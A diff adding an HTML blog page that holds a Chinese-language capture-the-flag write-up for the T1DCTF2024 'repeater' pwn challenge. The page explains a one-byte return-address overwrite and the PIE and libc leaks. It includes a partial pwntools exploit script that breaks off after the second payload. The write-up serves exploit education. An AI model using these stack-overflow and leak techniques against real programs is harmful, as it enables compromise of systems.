@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.119.0">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="LittFlower." />
+  <meta property="og:url" content="http://littflower.github.io/posts/t1dctf2024-writeup/" />
+  <link rel="canonical" href="http://littflower.github.io/posts/t1dctf2024-writeup/" /><link rel="alternate" type="application/atom+xml" href="http://littflower.github.ioindex.xml" title="一只花盆.">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "http:\/\/littflower.github.io"
+      },
+      "articleSection" : "posts",
+      "name" : "T1DCTF2024 WriteUp",
+      "headline" : "T1DCTF2024 WriteUp",
+      "description" : "补一下二队内测题。\nrepeater [easy] Repeater\nAs is well known, CTFers are all repeaters!\n栈溢出题目，sub_11C9() 可以栈溢出，只修改返回地址的 1 字节，可以做到 partial overwrite 无限循环 sub_11C9() 读入 payload。\n这里讲一下 fread 等 FILE 相关函数，后面也会用到。\nC 语言 FILE 函数\n既然没有空字符阶段，printf 就会把 retaddr 打印出来，从而获得 pie base。\n接下来的问题是怎么泄漏 libc，ropper 发现程序没有一个能用来控制 rdi 的 gadgets，细心会发现程序在结束 printf 后寄存器 rdi 上居然还保存着 libc 函数的地址，那直接 call puts 就可以泄漏了。\nfrom pwn import * proc = \u0026#34;.\/pwn\u0026#34; context.binary = proc context.log_level = \u0026#34;debug\u0026#34; io = process(proc) # io = remote(\u0026#34;tld1027.",
+      "inLanguage" : "en-US",
+      "author" : "LittFlower.",
+      "creator" : "LittFlower.",
+      "publisher": "LittFlower.",
+      "accountablePerson" : "LittFlower.",
+      "copyrightHolder" : "LittFlower.",
+      "copyrightYear" : "2024",
+      "datePublished": "2024-05-14 14:36:43 \u002b0800 CST",
+      "dateModified" : "2024-05-14 14:36:43 \u002b0800 CST",
+      "url" : "http:\/\/littflower.github.io\/posts\/t1dctf2024-writeup\/",
+      "keywords" : [ "Pwn", ]
+  }
+</script>
+<title>T1DCTF2024 WriteUp</title>
+  <meta property="og:title" content="T1DCTF2024 WriteUp" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="补一下二队内测题。
+repeater [easy] Repeater
+As is well known, CTFers are all repeaters!
+栈溢出题目，sub_11C9() 可以栈溢出，只修改返回地址的 1 字节，可以做到 partial overwrite 无限循环 sub_11C9() 读入 payload。
+这里讲一下 fread 等 FILE 相关函数，后面也会用到。
+C 语言 FILE 函数
+既然没有空字符阶段，printf 就会把 retaddr 打印出来，从而获得 pie base。
+接下来的问题是怎么泄漏 libc，ropper 发现程序没有一个能用来控制 rdi 的 gadgets，细心会发现程序在结束 printf 后寄存器 rdi 上居然还保存着 libc 函数的地址，那直接 call puts 就可以泄漏了。
+from pwn import * proc = &amp;#34;./pwn&amp;#34; context.binary = proc context.log_level = &amp;#34;debug&amp;#34; io = process(proc) # io = remote(&amp;#34;tld1027." />
+  <meta name="description" content="补一下二队内测题。
+repeater [easy] Repeater
+As is well known, CTFers are all repeaters!
+栈溢出题目，sub_11C9() 可以栈溢出，只修改返回地址的 1 字节，可以做到 partial overwrite 无限循环 sub_11C9() 读入 payload。
+这里讲一下 fread 等 FILE 相关函数，后面也会用到。
+C 语言 FILE 函数
+既然没有空字符阶段，printf 就会把 retaddr 打印出来，从而获得 pie base。
+接下来的问题是怎么泄漏 libc，ropper 发现程序没有一个能用来控制 rdi 的 gadgets，细心会发现程序在结束 printf 后寄存器 rdi 上居然还保存着 libc 函数的地址，那直接 call puts 就可以泄漏了。
+from pwn import * proc = &amp;#34;./pwn&amp;#34; context.binary = proc context.log_level = &amp;#34;debug&amp;#34; io = process(proc) # io = remote(&amp;#34;tld1027." />
+  <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:sarasa-fixed-sc,sans-serif;-webkit-font-smoothing:antialiased;src:url(https://cdn.jsdelivr.net/npm/firacode@6.2.0/distr/ttf/FiraCode-Light.ttf)format('ttf');margin:0 20px}article{max-width:1100px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:700;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:17.5px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#4005f3}.markdown-body blockquote{margin:0;padding:0 1em;color:#494d53;border-left:.25em solid #0b79e7}.markdown-body pre{padding:12px;overflow:auto;border-radius:10px}.markdown-body code{padding:.1em 0;font-size:100%;background-color:#eef1f3;border-radius:6px}.markdown-body pre>code{padding:0;font-size:95%;background-color:inherit;border:0}.markdown-body pre{background-color:#272822}.hljs{font-size:17.2px;color:#eef1f3}ul,ol{margin:.25em 0;line-height:1.6}ul ul,ul ol,ol ul,ol ol{margin:.25em 0}li{padding:.25em 0}h1{font-size:1.83rem}h2{font-size:1.74rem}h3{font-size:1.45rem}h4{font-size:1.28rem}h5{font-size:1.16rem}h6{font-size:1.21rem}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:source code pro,sans-serif;src:url(https://cdn.jsdelivr.net/npm/source-code-pro@2.38.0/WOFF/TTF/SourceCodePro-Bold.ttf.woff)format("woff")}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:700}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}:root{--nav-width:1380px;--article-width:650px;--toc-width:300px}.toc{margin:0 2px 40px;border:1px solid var(--border);background:var(--entry);border-radius:var(--radius);padding:.4em}.toc-container.wide{position:absolute;height:100%;border-right:1px solid var(--border);left:calc((var(--toc-width) + var(--gap)) * -1);top:calc(var(--gap) * 2);width:var(--toc-width)}.wide .toc{position:sticky;top:var(--gap);border:unset;background:unset;border-radius:unset;width:100%;margin:0 2px 40px}.toc details summary{cursor:zoom-in;margin-inline-start:20px;padding:12px 0}.toc details[open] summary{font-weight:500}.toc-container.wide .toc .inner{margin:0}.active{font-size:110%;font-weight:600}.toc ul{list-style-type:circle}.toc .inner{margin:0 0 0 20px;padding:0 15px 15px 20px;font-size:16px;max-height:83vh;overflow-y:auto}.toc .inner::-webkit-scrollbar-thumb{background:var(--border);border:7px solid var(--theme);border-radius:var(--radius)}.toc li ul{margin-inline-start:calc(var(--gap) * .5);list-style-type:none}.toc li{list-style:none;font-size:.95rem;padding-bottom:5px}.toc li a:hover{color:var(--secondary)}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="一只花盆.">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >小花ฅ.</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="https://blog.littflower.top/aboutme" target="_blank">AboutMe</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="https://github.com/LittFlower" target="_blank">Github</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="https://blog.littflower.top/friends" target="_blank">Friends</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">T1DCTF2024 WriteUp</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2024-05-14 14:36:43 CST">
+                14 May 2024
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+              <div class="post-author">
+                <a target="_blank" href="https://blog.littflower.top">@LittFlower.</a>
+              </div>
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <p>补一下二队内测题。</p>
+<h2 id="repeater">repeater</h2>
+<blockquote>
+<p>[easy] Repeater</p>
+<p>As is well known, CTFers are all repeaters!</p>
+</blockquote>
+<p>栈溢出题目，<code>sub_11C9()</code> 可以栈溢出，只修改返回地址的 1 字节，可以做到 partial overwrite 无限循环 <code>sub_11C9()</code> 读入 payload。</p>
+<p>这里讲一下 <code>fread</code> 等 FILE 相关函数，后面也会用到。</p>
+<p><a href="">C 语言 FILE 函数</a></p>
+<p>既然没有空字符阶段，printf 就会把 retaddr 打印出来，从而获得 pie base。</p>
+<p>接下来的问题是怎么泄漏 libc，ropper 发现程序没有一个能用来控制 rdi 的 gadgets，细心会发现程序在结束 printf 后寄存器 rdi 上居然还保存着 libc 函数的地址，那直接 <code>call puts</code> 就可以泄漏了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./pwn&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> proc
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(proc)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = remote(&#34;tld1027.com&#34;, 9030)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(proc)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>G:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x110</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb8</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;You say:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;281&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># input()</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(payload1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;bbbbbbbb&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>main_addr <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>pie_addr <span style="color:#f92672">=</span> main_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x12b8</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;pie_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(pie_addr)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">main_addr ===&gt; </span><span style="color:#e6db74">{</span>hex(main_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x110</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cccccccc&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb3</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;You say:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;281&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(payload2)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cccccccc&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
